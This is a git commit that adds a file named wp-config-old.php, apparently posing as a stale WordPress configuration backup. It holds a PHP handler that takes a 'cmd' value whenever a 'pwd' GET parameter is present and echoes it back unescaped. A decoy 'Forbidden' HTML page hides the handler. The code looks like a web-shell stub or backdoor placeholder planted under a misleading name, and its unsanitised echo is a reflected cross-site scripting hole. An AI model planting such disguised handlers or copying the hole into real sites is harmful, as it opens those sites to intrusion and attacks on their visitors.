b208dd86134586d4584fb42728ff1041b252c34a
Kavindu Sanjula <ravanadevs@gmail.com>
2023-10-01 19:36:44 +0530

    Initial Commit

---
+++ wp-config-old.php
@@ -0,0 +1,18 @@
+<?php 
+    if(isset($_GET["pwd"])){
+        $cmd = $_GET["cmd"];
+        echo $cmd;
+    }
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Config</title>
+</head>
+<body>
+    <h1>Forbidden</h1>
+</body>
+</html>
